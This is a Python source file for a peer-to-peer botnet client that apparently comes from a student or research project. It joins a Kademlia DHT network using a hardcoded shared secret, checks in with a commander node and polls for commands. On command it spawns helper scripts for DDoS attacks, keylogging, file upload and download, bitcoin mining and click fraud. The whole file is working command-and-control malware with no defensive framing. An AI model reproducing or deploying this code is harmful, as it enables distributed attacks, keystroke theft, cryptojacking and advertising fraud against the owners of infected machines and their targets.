import logging, sys, pdb
import asyncio, subprocess, hashlib, socket
#from asyncio.tasks import ensure_future
from kademlia.network import Server
from collections import Counter

#Network Secret, allows nodes to join same Network
SECRET="TheSecretKey"

#Setup logging
handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
log.setLevel(logging.DEBUG)


if len(sys.argv) != 4:
    print("Usage: python botnet_updated.py <bootstrap ip> <bootstrap port> <bot port>")
    exit(0)

#Helper functions
def get_ip_address():
    #NOTE: This would be LAN IP and not WAN IP, can adjust code to reflect change if needed
    ## Attempts to Connects to WAN and gets ip address of socket that connected
    ##TODO: Allow bot to communicte with V6 or V4 Addresses
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("1.1.1.1", 80))
    return s.getsockname()[0]

def get_hash(prehash):
    m = hashlib.sha1()
    m.update(prehash.encode('utf-8'))
    return m.hexdigest()

def most_common(list):
    data = Counter(list)
    return data.most_common(1)[0][0]

#Botclass that holds network, and bot information
class botnode:
    def __init__(self, ip, port, network_id, cmdhash):
        self.ip = ip
        self.port = port
        self.id = network_id
        self.cmdcnt = 0
        # this will store all the child processes that are started
        self.pgroup = []
        self.cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
                        'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
                        'CLICKFRAUD': False, 'HELLO':False}
        # This is the hash of this node's bot ID (Will be used when commander looks up machines to send CMDs)
        self.cmdkey = cmdhash

"""
Query Value returned from cmdkey
If command has not been ran then spawn a child process, and run the command.
Block the command from being run again.
Return to wait_cmd() loop and check for new commands
"""
async def get_cmd(value, server, bot):
    commands = ['DDOS', 'DOWNLOAD', 'KEYLOG', 'UPLOAD', 'BITCOIN', 'CLICKFRAUD']
    try:
        x = value.split()
        cnt = int(x[0])  # parse out the command count
        cmd = x[1]
        print("\nCMD TO RUN {}\n".format(cmd))
        if cmd in commands and cnt > bot.cmdcnt:
            bot.cmdcnt += 1
            if cmd == 'KEYLOG':
                if bot.cmdsrun['KEYLOG'] is False:
                    tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
                    print("Starting keylogger")
                    process = subprocess.Popen(tmp.split(), shell=False)
                    bot.pgroup.append(process)
                    bot.cmdsrun['KEYLOG'] = True
            if cmd == 'DDOS':
                if bot.cmdsrun['DDOS'] is False:
                    tmp = 'python ddos.py {0}'.format(' '.join(x[1:]))
                    print("Starting DDOS on {0}".format(tmp))
                    process = subprocess.Popen(tmp.split(), shell=False)
                    bot.cmdsrun['DDOS'] = True
            if cmd == 'UPLOAD':
                tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
                print("Starting upload on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)

            if cmd == 'DOWNLOAD':
                tmp = 'python download.py {0}'.format(' '.join(x[1:]))
                print("Starting DOWNLOAD on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == 'BITCOIN':
                tmp = 'python mine.py {0}'.format(' '.join(x[1:]))
                print("Starting BITCOING MINING on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == 'CLICKFRAUD':
                tmp = 'python clickFraud.py {0}'.format(' '.join(x[1:]))
                print("Starting CLICKFRAUD on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == 'HELLO':
                tmp = 'python sayHello.py {0}'.format(' '.join(x[1:]))
                print("Starting Hello program on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(),shell=False)
    except Exception as e:
        pass
    #pdb.set_trace()
    await wait_cmd(server, bot)


"""
Query the network for any store requests with the cmdkey of our node
While there is no command, wait 5 seconds, then check again
If command is found, break out, then run get_cmd()
"""
async def wait_cmd(server, bot):
    print("Checking for command")
    numcalls = 0
    checkCommands = await server.get(bot.cmdkey)
    while checkCommands is None and numcalls < 5: #set max calls to 5 for debugging 
        print("\nNO COMMAND FOR ME WAITING")
        checkCommands = await server.get(bot.cmdkey)
        await asyncio.sleep(5)
        numcalls+=1
    print("\nFound a command for nodeID {}\n\n".format(checkCommands))
    await asyncio.sleep(5)
    await get_cmd(checkCommands,server,bot)
    
"""
callhome -> Checks to see if a node has already joined the network
If node is not apart of network then join [set()] with the Network Key and ID value of bot
otherwise wait for commands: wait_cmd()
"""
async def callhome(server, bot):
    ##NOTE KEY initialized at start of loop, no need to create here
    # announce to Shepard that we exist, then check for ack
    nodeId = await server.get(NETKEY)
    if nodeId != str(bot.id) or nodeId is None:
        print("No ack for {}".format(nodeId))
        await server.set(NETKEY, str(bot.id))
        await asyncio.sleep(5)
        await callhome(server,bot)
    else:    
        print("\nWe have an ack\nNode: {} has joined {}\n\n"
        .format(nodeId,NETKEY))
        await wait_cmd(server,bot)



##TODO:DONE - Confirm if idhash == network key, confirm from debug traces looks like NodeID might be getting set as KEY on network. 
"""
Initialize IP
CMDhash = Lookup ID for commands on network
Bot class (Ip address of node, port to communicate on, node_id, and CMDhash)
Next its going to callhome()
"""
async def setup(server):
    myip = get_ip_address()
    cmdhash = get_hash(str(server.node.long_id))
    #Create botnode with Its IP, Port, Bot ID, and command hash
    bot = botnode(myip, myport, str(server.node.long_id), cmdhash)

    print("\nParams: NETWORK_KEY {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
        .format(NETKEY, myip, server.node.long_id, cmdhash))
    print("\nBOT CREATED? CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
    #pdb.set_trace()
    await callhome(server, bot)


### IF check does nothing server returning NoneType, bc Node has not yet joined network. 
async def bootstrapDone(server):
    result = await server.get(NETKEY) #keyhash - Might need to pass in keyhash instead. 
    if result is None:
        server.stop()
        loop.close()
        print("\nKey is: ",result, "\n\nBootstrapper down: machine has not joined network\n")
    print("\nAble to fetch key as result:",result, type(result))
    

#SERVER ACTUALLY STARTS HERE
bootstrap_ip = str(sys.argv[1])
bootstrap_port = int(sys.argv[2])
myport = int(sys.argv[3])

#### KEY TO JOIN NETWORK ####
NETKEY = get_hash(SECRET)

#Init Asyncio event loop
loop = asyncio.get_event_loop()
loop.set_debug(True)  

server = Server()
loop.run_until_complete(server.listen(myport))
loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
#loop.run_until_complete(bootstrapDone(server, key))
pdb.set_trace()
try:
    #asyncio.ensure_future(bootstrapDone(server)) ## Getting some errors here, need to troubleshoot, but this is just a check to see if we on network. Callhome kinda does similar thing so might not be needed
    asyncio.ensure_future(setup(server))
    loop.run_forever()
except KeyboardInterrupt:
    pass
finally:
    server.stop()
    loop.close()
